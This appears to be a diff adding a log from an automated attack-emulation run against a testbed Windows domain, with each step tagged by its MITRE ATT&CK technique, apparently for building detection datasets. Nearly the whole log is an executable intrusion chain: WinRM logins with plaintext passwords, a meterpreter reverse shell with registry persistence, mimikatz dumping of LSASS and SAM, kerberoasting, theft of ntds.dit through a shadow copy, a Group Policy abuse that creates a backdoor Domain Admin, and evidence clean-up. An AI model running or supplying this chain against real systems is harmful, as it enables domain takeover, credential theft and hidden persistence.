@@ -1,0 +1,131 @@
+2025-10-28 15:52:29 INFO - Delay before commands: 15.0 seconds
+2025-10-28 15:52:29 INFO - Sleeping 600 seconds
+2025-10-28 16:02:44 INFO - Executing Shell-Command: 'evil-winrm -i 10.10.10.10 -u Alice -p 'Pa$$w0rd'
+'
+2025-10-28 16:02:44 INFO - Metadata: {"techniques": "T1021.006", "tactics": "Lateral Movement", "technique_name": "Remote Services: Windows Remote Management"}
+2025-10-28 16:03:32 INFO - Executing Shell-Command: 'type C:\Scripts\Logger.ps1
+'
+2025-10-28 16:03:57 INFO - Executing Shell-Command: 'type C:\Scripts\userlog.log -Tail 15
+'
+2025-10-28 16:04:22 INFO - Executing Shell-Command: 'schtasks /query
+'
+2025-10-28 16:04:48 INFO - Executing Shell-Command: 'Add-Content -Path "C:\Scripts\Logger.ps1" -Value "net localgroup administrators alice /add"
+'
+2025-10-28 16:04:48 INFO - Metadata: {"techniques": "T1053.005", "tactics": "Privilege Escalation", "technique_name": "Scheduled Task/Job: Scheduled Task"}
+2025-10-28 16:04:58 INFO - Sleeping 60 seconds
+2025-10-28 16:06:13 INFO - Generating Msf-Payload: 'windows/x64/meterpreter/reverse_tcp'
+2025-10-28 16:06:29 INFO - Run in background: msf-module(exploit/multi/handler)
+2025-10-28 16:06:49 INFO - Executing Shell-Command: 'upload /home/superuser/payloads/msfshell.exe C:\\Users\\Public\\msfshell.exe
+'
+2025-10-28 16:07:15 INFO - Executing Shell-Command: 'New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Persistence" -Value "C:\Users\Public\msfshell.exe" -PropertyType "String" -Force
+'
+2025-10-28 16:07:15 INFO - Metadata: {"techniques": "T1547.001", "tactics": "Persistence", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"}
+2025-10-28 16:07:40 INFO - Executing Shell-Command: 'C:\Users\Public\msfshell.exe
+'
+2025-10-28 16:08:05 INFO - Executing Msf-Session-Command: 'getuid'
+2025-10-28 16:12:52 INFO - Executing a msf-command
+2025-10-28 16:13:08 INFO - Executing Msf-Session-Command: 'getsystem'
+2025-10-28 16:13:08 INFO - Executing a msf-command
+2025-10-28 16:13:24 INFO - Executing Msf-Session-Command: 'getuid'
+2025-10-28 16:13:24 INFO - Executing a msf-command
+2025-10-28 16:13:41 INFO - Executing Msf-Session-Command: 'pgrep lsass'
+2025-10-28 16:13:41 INFO - Executing a msf-command
+2025-10-28 16:13:42 WARNING - Setting Variable: '$LSASS_PID'
+2025-10-28 16:13:57 INFO - Executing Msf-Session-Command: 'migrate 680
+'
+2025-10-28 16:13:57 INFO - Metadata: {"techniques": "T1055", "tactics": "Defense Evasion", "technique_name": "Process Injection"}
+2025-10-28 16:13:57 INFO - Executing a msf-command
+2025-10-28 16:13:58 INFO - Sleeping 10 seconds
+2025-10-28 16:14:23 INFO - Executing Msf-Session-Command: 'getpid'
+2025-10-28 16:14:23 INFO - Executing a msf-command
+2025-10-28 16:14:39 INFO - Executing Msf-Session-Command: 'load kiwi'
+2025-10-28 16:14:39 INFO - Executing a msf-command
+2025-10-28 16:14:55 INFO - Executing Msf-Session-Command: 'kiwi_cmd "privilege::debug"'
+2025-10-28 16:14:56 INFO - Executing a msf-command
+2025-10-28 16:15:12 INFO - Executing Msf-Session-Command: 'kiwi_cmd "sekurlsa::logonpasswords"'
+2025-10-28 16:15:12 INFO - Metadata: {"techniques": "T1003.001", "tactics": "Credential Access", "technique_name": "OS Credential Dumping: LSASS Memory"}
+2025-10-28 16:15:12 INFO - Executing a msf-command
+2025-10-28 16:15:28 INFO - Executing Msf-Session-Command: 'kiwi_cmd "lsadump::cache"'
+2025-10-28 16:15:28 INFO - Metadata: {"techniques": "T1003.005", "tactics": "Credential Access", "technique_name": "OS Credential Dumping: Cached Domain Credentials"}
+2025-10-28 16:15:28 INFO - Executing a msf-command
+2025-10-28 16:15:44 INFO - Executing Msf-Session-Command: 'kiwi_cmd "lsadump::sam"'
+2025-10-28 16:15:44 INFO - Metadata: {"techniques": "T1003.002", "tactics": "Credential Access", "technique_name": "OS Credential Dumping: Security Account Manager"}
+2025-10-28 16:15:44 INFO - Executing a msf-command
+2025-10-28 16:16:01 INFO - Executing Shell-Command: 'upload /home/superuser/payloads/Rubeus.exe C:\\Users\\Public\\Rubeus.exe
+'
+2025-10-28 16:16:27 INFO - Executing Msf-Session-Command: 'execute -f C:\\Users\\Public\\Rubeus.exe -a "kerberoast /nowrap" -i'
+2025-10-28 16:16:27 INFO - Metadata: {"techniques": "T1558.003", "tactics": "Credential Access", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting"}
+2025-10-28 16:16:27 INFO - Executing a msf-command
+2025-10-28 16:16:28 WARNING - Debug: 'Cracking the hash of wsadmin obtained through kerberoasting offline ...'
+2025-10-28 16:16:43 INFO - Executing Shell-Command: 'evil-winrm -i 10.10.10.10 -u wsadmin -p 'Root.PW1'
+'
+2025-10-28 16:16:43 INFO - Metadata: {"techniques": "T1021.006", "tactics": "Lateral Movement", "technique_name": "Remote Services: Windows Remote Management"}
+2025-10-28 16:17:29 INFO - Executing Shell-Command: 'upload /home/superuser/payloads/SharpGPOAbuse.exe C:\\Users\\Public\\SharpGPOAbuse.exe
+'
+2025-10-28 16:17:55 INFO - Executing Shell-Command: '$Username = "wsadmin";
+'
+2025-10-28 16:18:20 INFO - Executing Shell-Command: '$Password = "Root.PW1";
+'
+2025-10-28 16:18:45 INFO - Executing Shell-Command: '$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
+'
+2025-10-28 16:19:11 INFO - Executing Shell-Command: '$Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword);
+'
+2025-10-28 16:19:36 INFO - Executing Shell-Command: '$Session = New-PSSession -ComputerName DC1 -Credential $Credential;
+'
+2025-10-28 16:19:36 INFO - Metadata: {"techniques": "T1021.006", "tactics": "Lateral Movement", "technique_name": "Remote Services: Windows Remote Management"}
+2025-10-28 16:20:04 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { reg.exe save HKLM\SYSTEM C:\Users\Public\SYSTEM.hive /y; }
+'
+2025-10-28 16:20:04 INFO - Metadata: {"techniques": "T1006", "tactics": "Defense Evasion, Credential Access", "technique_name": "Direct Volume Access"}
+2025-10-28 16:20:49 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { reg.exe save HKLM\SAM C:\Users\Public\SAM.hive /y; }
+'
+2025-10-28 16:20:49 INFO - Metadata: {"techniques": "T1006", "tactics": "Defense Evasion, Credential Access", "technique_name": "Direct Volume Access"}
+2025-10-28 16:21:44 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { vssadmin CREATE SHADOW /For=C:; }
+'
+2025-10-28 16:21:44 INFO - Metadata: {"techniques": "T1006", "tactics": "Defense Evasion, Credential Access", "technique_name": "Direct Volume Access"}
+2025-10-28 16:22:30 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { $ShadowCopyVolume = (vssadmin list shadows | Select-String "Shadow Copy Volume:" | Select-Object -First 1).ToString().Split(":")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\Windows\NTDS\ntds.dit c:\Users\Public\ntds.dit; }
+'
+2025-10-28 16:22:30 INFO - Metadata: {"techniques": "T1006", "tactics": "Defense Evasion, Credential Access", "technique_name": "Direct Volume Access"}
+2025-10-28 16:23:17 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { vssadmin delete shadows /All /Quiet; }
+'
+2025-10-28 16:23:17 INFO - Metadata: {"techniques": "T1006", "tactics": "Defense Evasion, Credential Access", "technique_name": "Direct Volume Access"}
+2025-10-28 16:24:02 INFO - Executing Shell-Command: 'Copy-Item -Path C:\Users\Public\SAM.hive -FromSession $Session -Destination C:\Users\Public\;
+'
+2025-10-28 16:24:28 INFO - Executing Shell-Command: 'Copy-Item -Path C:\Users\Public\SYSTEM.hive -FromSession $Session -Destination C:\Users\Public\;
+'
+2025-10-28 16:24:55 INFO - Executing Shell-Command: 'Copy-Item -Path C:\Users\Public\ntds.dit -FromSession $Session -Destination C:\Users\Public;
+'
+2025-10-28 16:25:22 INFO - Executing Shell-Command: 'download C:\\Users\\Public\\SAM.hive
+'
+2025-10-28 16:25:48 INFO - Executing Shell-Command: 'download C:\\Users\\Public\\SYSTEM.hive
+'
+2025-10-28 16:26:52 INFO - Executing Shell-Command: 'download C:\\Users\\Public\\ntds.dit
+'
+2025-10-28 16:28:06 WARNING - Debug: 'Decrypting ntds.dit offline ...'
+2025-10-28 16:28:21 INFO - Executing Shell-Command: 'Copy-Item -Path C:\Users\Public\SharpGPOAbuse.exe -ToSession $Session -Destination C:\Users\Public;
+'
+2025-10-28 16:28:47 INFO - Executing Shell-Command: 'tr -dc A-Za-z0-9 </dev/urandom | head -c 10'
+2025-10-28 16:28:47 WARNING - Setting Variable: '$BACKDOOR_NAME'
+2025-10-28 16:29:02 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { Write-Output "New-ADUser -Name CntUOE8sag -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1" > C:\Users\Public\adduser.ps1; }
+'
+2025-10-28 16:29:27 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { Write-Output "Add-ADGroupMember -Identity 'Domain Admins' -Members CntUOE8sag" >> C:\Users\Public\adduser.ps1; }
+'
+2025-10-28 16:29:52 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { New-GPO -Name "CntUOE8sag"; }
+'
+2025-10-28 16:29:52 INFO - Metadata: {"techniques": "T1484.001", "tactics": "Persistence, Defense Evasion", "technique_name": "Domain or Tenant Policy Modification: Group Policy Modification"}
+2025-10-28 16:30:19 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { C:\Users\Public\SharpGPOAbuse.exe --AddComputerTask --GPOName CntUOE8sag --Author wsadmin --TaskName "CntUOE8sag" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\Users\Public\adduser.ps1'; }
+'
+2025-10-28 16:30:19 INFO - Metadata: {"techniques": "T1484.001", "tactics": "Persistence, Defense Evasion", "technique_name": "Domain or Tenant Policy Modification: Group Policy Modification"}
+2025-10-28 16:30:45 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { gpupdate /force; }
+'
+2025-10-28 16:30:45 INFO - Metadata: {"techniques": "T1484.001", "tactics": "Persistence, Defense Evasion", "technique_name": "Domain or Tenant Policy Modification: Group Policy Modification"}
+2025-10-28 16:31:10 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { Remove-GPLink -Name "CntUOE8sag" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; }
+'
+2025-10-28 16:31:35 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { Remove-GPO -Name "CntUOE8sag" -Confirm:0; }
+'
+2025-10-28 16:32:00 INFO - Executing Shell-Command: 'Invoke-Command -Session $Session -ScriptBlock { Remove-Item C:\Users\Public\*.* -Force; }
+'
+2025-10-28 16:32:25 INFO - Executing Shell-Command: 'Remove-Item C:\Users\Public\*.* -Force
+'
+2025-10-28 16:32:50 INFO - Executing Shell-Command: 'rm *.hive *.dit'
+2025-10-28 16:32:50 WARNING - Cleaning up session stores
+2025-10-28 16:32:51 INFO - Msf session 1 stopped successfully.
